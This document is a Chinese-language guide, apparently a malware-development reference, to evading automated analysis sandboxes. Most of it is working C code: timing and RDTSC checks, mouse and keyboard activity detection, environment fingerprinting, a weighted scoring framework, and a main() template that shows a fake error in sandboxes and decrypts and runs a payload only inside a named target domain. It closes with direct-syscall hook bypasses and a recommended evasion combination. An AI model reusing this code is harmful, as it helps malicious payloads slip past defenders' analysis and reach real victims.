# 定时与用户交互沙箱逃逸实现

> 沙箱的核心弱点：**有限的分析时间**和**缺乏真实用户**。利用这两点可以绕过绝大多数自动化分析环境。

---

## 1. 时间类逃逸技术

### 1.1 Sleep 延迟检测 (NtDelayExecution Hook Detection)

```c
// 沙箱常见行为: Hook Sleep/NtDelayExecution → 跳过等待
// 检测方法: 测量 Sleep 前后的真实时间差

#include <windows.h>

int detect_sleep_acceleration() {
    DWORD t1 = GetTickCount();
    Sleep(10000);  // Sleep 10 秒
    DWORD t2 = GetTickCount();
    DWORD elapsed = t2 - t1;

    // 如果实际经过时间 < 9 秒 → Sleep 被加速/跳过
    if (elapsed < 9000) {
        return 1;  // 沙箱
    }
    return 0;
}
```

### 1.2 QueryPerformanceCounter 一致性检查

```c
// 使用高精度计时器，比 GetTickCount 更难 hook

int detect_timing_inconsistency() {
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);

    // 执行一段已知耗时的操作
    volatile int x = 0;
    for (int i = 0; i < 100000000; i++) {
        x += i;
    }

    QueryPerformanceCounter(&t2);
    double elapsed_ms = (double)(t2.QuadPart - t1.QuadPart) * 1000.0 / freq.QuadPart;

    // 1亿次循环在真实 CPU 上约 200-800ms
    // 如果 < 50ms → 被加速或虚拟化
    // 如果 > 5000ms → 被单步调试
    if (elapsed_ms < 50 || elapsed_ms > 5000) {
        return 1;
    }
    return 0;
}
```

### 1.3 RDTSC 时序检测 (Detect Single-Step Debugger)

```c
// RDTSC 直接读取 CPU 时间戳计数器
// 调试器单步执行时每条指令间隔极大

int detect_debugger_rdtsc() {
    unsigned long long t1, t2;

    t1 = __rdtsc();
    // 中间执行一些指令（不能被优化掉）
    __cpuid((int[4]){0}, 0);
    __cpuid((int[4]){0}, 0);
    __cpuid((int[4]){0}, 0);
    t2 = __rdtsc();

    // 物理机正常执行: 差值 < 1000 cycles
    // VM Exit 导致: 差值约 1000-5000 cycles
    // 调试器单步: 差值 >> 10000 cycles
    if (t2 - t1 > 10000) {
        return 1;  // 被调试
    }
    return 0;
}
```

### 1.4 时间加速检测 (Sleep 10s + 验证)

```c
// 综合方法: 多个时间源交叉验证

int detect_time_acceleration() {
    // 获取系统时间（NTP 同步的真实时间）
    SYSTEMTIME st1, st2;
    GetSystemTime(&st1);

    // 获取 Tick（开机后经过的时间）
    DWORD tick1 = GetTickCount64();

    // Sleep 10 秒
    Sleep(10000);

    GetSystemTime(&st2);
    DWORD tick2 = GetTickCount64();

    // 计算两种时间源的差值
    DWORD tick_elapsed = tick2 - tick1;

    // 系统时间差（秒）
    ULONGLONG ft1, ft2;
    SystemTimeToFileTime(&st1, (FILETIME*)&ft1);
    SystemTimeToFileTime(&st2, (FILETIME*)&ft2);
    double sys_elapsed_ms = (double)(ft2 - ft1) / 10000.0;

    // 两个时间源应该一致
    // 如果 tick 差远小于 sys 差 → tick 被加速
    // 如果 sys 差远小于 tick 差 → 系统时间被修改
    double ratio = tick_elapsed / sys_elapsed_ms;
    if (ratio < 0.8 || ratio > 1.2) {
        return 1;  // 时间不一致 → 分析环境
    }

    // Sleep 是否真的等了 10 秒
    if (tick_elapsed < 9000) {
        return 1;
    }

    return 0;
}
```

### 1.5 计划执行 (Wait Until Business Hours)

```c
// 只在工作时间执行 → 沙箱通常不等待数小时

int wait_for_business_hours() {
    while (1) {
        SYSTEMTIME st;
        GetLocalTime(&st);

        // 工作日 (周一=1 到 周五=5) 且 9:00-17:00
        if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 &&
            st.wHour >= 9 && st.wHour < 17) {
            return 1;  // 工作时间，执行 payload
        }

        // 非工作时间 → 等 30 分钟再检查
        Sleep(30 * 60 * 1000);
    }
}
```

### 1.6 Slow-Burn 延迟执行

```c
// 延迟数天后执行 → 超出任何沙箱的分析时间

int slow_burn_check() {
    // 方法 1: 检查系统安装日期 → 只在已运行数天的系统上执行
    HKEY hKey;
    DWORD installDate = 0;
    DWORD size = sizeof(DWORD);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hKey);
    RegQueryValueEx(hKey, "InstallDate", NULL, NULL,
        (LPBYTE)&installDate, &size);
    RegCloseKey(hKey);

    time_t now = time(NULL);
    // 系统安装超过 3 天
    if ((now - installDate) < 3 * 24 * 3600) {
        return 0;  // 太新的系统 → 可能是沙箱
    }

    // 方法 2: 检查系统运行时间
    DWORD uptime = GetTickCount64() / 1000;
    if (uptime < 30 * 60) {  // 运行时间 < 30 分钟
        return 0;  // 刚启动 → 可能是沙箱
    }

    return 1;
}
```

---

## 2. 用户交互检测

### 2.1 鼠标移动模式检测

```c
// 真实用户的鼠标轨迹有随机性和弯曲度
// 沙箱模拟的鼠标通常是直线/匀速

int detect_real_mouse_movement() {
    POINT points[20];
    int movement_count = 0;

    for (int i = 0; i < 20; i++) {
        GetCursorPos(&points[i]);
        Sleep(500);
    }

    // 检查是否有移动
    for (int i = 1; i < 20; i++) {
        if (points[i].x != points[i-1].x ||
            points[i].y != points[i-1].y) {
            movement_count++;
        }
    }

    // 10 秒内至少 3 次移动
    if (movement_count < 3) {
        return 0;  // 无鼠标移动 → 沙箱
    }

    // 检查非直线运动（真实用户的鼠标轨迹有弯曲）
    int direction_changes = 0;
    for (int i = 2; i < 20; i++) {
        int dx1 = points[i-1].x - points[i-2].x;
        int dy1 = points[i-1].y - points[i-2].y;
        int dx2 = points[i].x - points[i-1].x;
        int dy2 = points[i].y - points[i-1].y;

        // 方向变化
        if ((dx1 > 0 && dx2 < 0) || (dx1 < 0 && dx2 > 0) ||
            (dy1 > 0 && dy2 < 0) || (dy1 < 0 && dy2 > 0)) {
            direction_changes++;
        }
    }

    // 真实用户至少有几次方向变化
    if (direction_changes < 2) {
        return 0;  // 直线运动 → 模拟鼠标
    }

    return 1;
}
```

### 2.2 键盘输入检测

```c
// 真实系统中用户会有键盘输入

int detect_keyboard_activity() {
    int key_count = 0;

    // 监听 30 秒
    DWORD start = GetTickCount();
    while (GetTickCount() - start < 30000) {
        for (int vk = 0x08; vk <= 0xFE; vk++) {
            if (GetAsyncKeyState(vk) & 0x0001) {
                key_count++;
            }
        }
        Sleep(100);
    }

    // 30 秒内至少有一些按键
    return key_count > 5 ? 1 : 0;
}
```

### 2.3 屏幕分辨率与多显示器

```c
int detect_real_display() {
    int score = 0;

    // 分辨率检查
    int cx = GetSystemMetrics(SM_CXSCREEN);
    int cy = GetSystemMetrics(SM_CYSCREEN);

    // 常见真实分辨率: 1920x1080, 2560x1440, 3840x2160
    // 沙箱常见: 800x600, 1024x768
    if (cx >= 1920 && cy >= 1080) score++;
    if (cx <= 800 || cy <= 600) return 0;  // 太低 → 沙箱

    // 多显示器检查
    int monitors = GetSystemMetrics(SM_CMONITORS);
    if (monitors >= 2) score++;  // 多显示器 → 大概率真实

    // 颜色深度
    HDC hdc = GetDC(NULL);
    int bits = GetDeviceCaps(hdc, BITSPIXEL);
    ReleaseDC(NULL, hdc);
    if (bits >= 32) score++;

    return score >= 1 ? 1 : 0;
}
```

### 2.4 打开的窗口数量

```c
// 真实用户通常有多个窗口打开

DWORD g_window_count = 0;
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        g_window_count++;
    }
    return TRUE;
}

int detect_window_count() {
    g_window_count = 0;
    EnumWindows(EnumWindowsProc, 0);

    // 真实用户通常 > 10 个可见窗口
    return g_window_count > 10 ? 1 : 0;
}
```

### 2.5 最近文件与浏览器历史

```c
int detect_user_artifacts() {
    int score = 0;

    // RecentDocs 注册表 — 记录最近打开的文件
    HKEY hKey;
    DWORD count = 0;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryInfoKey(hKey, NULL, NULL, NULL, NULL, NULL, NULL,
            &count, NULL, NULL, NULL, NULL);
        RegCloseKey(hKey);
        if (count > 20) score++;  // 真实用户有大量最近文件
    }

    // 浏览器 profile 目录存在
    char path[MAX_PATH];
    ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default",
        path, MAX_PATH);
    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
        score++;  // Chrome profile 存在
    }

    // USB 设备历史
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Enum\\USB", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD subkeys = 0;
        RegQueryInfoKey(hKey, NULL, NULL, NULL, &subkeys, NULL, NULL,
            NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hKey);
        if (subkeys > 10) score++;  // 多个 USB 设备历史
    }

    // 打印机数量
    DWORD needed = 0, returned = 0;
    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 1, NULL, 0, &needed, &returned);
    if (returned > 0) score++;  // 有安装的打印机

    return score >= 2 ? 1 : 0;
}
```

---

## 3. 环境 Fingerprinting

### 3.1 综合环境评分

```c
typedef struct {
    const char* name;
    int (*check_func)();
    int weight;
} EnvironmentCheck;

int check_memory() {
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    return mem.ullTotalPhys >= 4ULL * 1024 * 1024 * 1024;  // >= 4GB
}

int check_cpu_cores() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors >= 2;
}

int check_disk_size() {
    ULARGE_INTEGER total;
    GetDiskFreeSpaceExA("C:\\", NULL, &total, NULL);
    return total.QuadPart >= 60ULL * 1024 * 1024 * 1024;  // >= 60GB
}

int check_process_count() {
    DWORD pids[1024];
    DWORD needed;
    EnumProcesses(pids, sizeof(pids), &needed);
    int count = needed / sizeof(DWORD);
    return count >= 40;  // 真实系统通常 > 40 个进程
}

int check_installed_programs() {
    HKEY hKey;
    DWORD subkeys = 0;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryInfoKey(hKey, NULL, NULL, NULL, &subkeys,
            NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hKey);
    }
    return subkeys >= 20;  // 真实系统通常安装 20+ 程序
}

int check_domain_joined() {
    LPWSTR buf = NULL;
    NETSETUP_JOIN_STATUS status;
    NetGetJoinInformation(NULL, &buf, &status);
    if (buf) NetApiBufferFree(buf);
    return status == NetSetupDomainName;  // 已加域 → 企业环境
}

int check_uptime() {
    DWORD uptime_sec = GetTickCount64() / 1000;
    return uptime_sec >= 30 * 60;  // 运行 >= 30 分钟
}
```

---

## 4. 综合检测框架 (C/C++)

### 4.1 分数累计法

```c
// 核心理念: 单个弱信号不可靠，多个弱信号累计 = 强判断

int comprehensive_sandbox_check() {
    EnvironmentCheck checks[] = {
        {"Memory >= 4GB",        check_memory,            2},
        {"CPU >= 2 cores",       check_cpu_cores,         2},
        {"Disk >= 60GB",         check_disk_size,         2},
        {"Process count >= 40",  check_process_count,     3},
        {"Installed programs",   check_installed_programs, 2},
        {"Domain joined",        check_domain_joined,     3},
        {"Uptime >= 30min",      check_uptime,            2},
        {"Real display",         detect_real_display,     2},
        {"Window count > 10",    detect_window_count,     2},
        {"User artifacts",       detect_user_artifacts,   3},
        {"Sleep not hooked",     detect_sleep_acceleration, 4},
        {"RDTSC consistent",     detect_timing_inconsistency, 3},
        {"Mouse movement",       detect_real_mouse_movement, 3},
    };

    int total_score = 0;
    int max_score = 0;
    int num_checks = sizeof(checks) / sizeof(checks[0]);

    for (int i = 0; i < num_checks; i++) {
        max_score += checks[i].weight;
        if (checks[i].check_func()) {
            total_score += checks[i].weight;
        }
    }

    // 通过率 >= 60% → 认为是真实环境
    // 阈值可根据目标调整（越高越严格，但可能误判）
    double pass_rate = (double)total_score / max_score;

    return pass_rate >= 0.60 ? 1 : 0;  // 1 = 真实环境, 0 = 沙箱
}
```

### 4.2 使用模板

```c
// 完整逃逸流程

int main() {
    // Phase 1: 综合环境检测
    if (!comprehensive_sandbox_check()) {
        // 执行无害 decoy 行为
        MessageBoxA(NULL, "This application requires .NET 4.8",
                    "Runtime Error", MB_ICONERROR);
        return 1;
    }

    // Phase 2: Guardrails (目标环境限制)
    // 只在目标域执行
    char domain[256] = {0};
    DWORD size = 256;
    GetComputerNameExA(ComputerNameDnsDomain, domain, &size);
    if (strstr(domain, "target-corp.local") == NULL) {
        return 0;  // 非目标环境 → 静默退出
    }

    // Phase 3: 解密并执行 payload
    decrypt_and_execute_payload();
    return 0;
}
```

### 4.3 直接 Syscall 版本 (规避 Hook)

```c
// 沙箱通过 hook ntdll.dll 拦截 API 调用
// 直接使用 syscall 指令可以绕过 hook

// 示例: 直接调用 NtDelayExecution (替代 Sleep)
// syscall number 在不同 Windows 版本不同

// 方法: 运行时从 ntdll.dll 读取 syscall number
DWORD get_syscall_number(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);
    // Nt 函数开头: mov r10, rcx; mov eax, <syscall_number>
    // 字节序列: 4C 8B D1 B8 XX XX XX XX
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 &&
        func[3] == 0xB8) {
        return *(DWORD*)(func + 4);
    }
    // 如果被 hook（开头不是标准模式）→ 从磁盘上的 ntdll 读取
    return 0;
}

// 使用 SysWhispers3 / HellsGate / HalosGate 自动化实现
// 这些工具自动解析 syscall number 并生成直接调用代码
```

---

## 5. 对抗策略总结

```
效果与隐蔽性矩阵:

技术                    | 绕过效果 | 实现难度 | 被检测风险
-----------------------|---------|---------|----------
Sleep + GetTickCount   | 低      | 低      | 高（已被大多数沙箱对抗）
RDTSC timing           | 高      | 中      | 低（底层指令难 hook）
用户交互检测            | 高      | 中      | 低（沙箱难以完美模拟）
环境资源检查            | 中      | 低      | 中（沙箱可增加资源）
Guardrails (域名/用户) | 极高    | 低      | 极低（沙箱无法匹配目标）
分数累计法              | 极高    | 中      | 极低（多个弱信号组合）
直接 syscall           | 高      | 高      | 低（绕过 hook 层）

推荐组合（最佳实践）:
├─ Guardrails（目标域检测）→ 零成本直接过沙箱
├─ RDTSC timing → 底层难 hook
├─ 分数累计法（5+ 环境指标）→ 容忍单项误判
└─ 直接 syscall → 绕过 hook 层
```

---

## 关联参考

- **完整反虚拟化/反调试代码片段集** → `anti-vm-snippets.md`
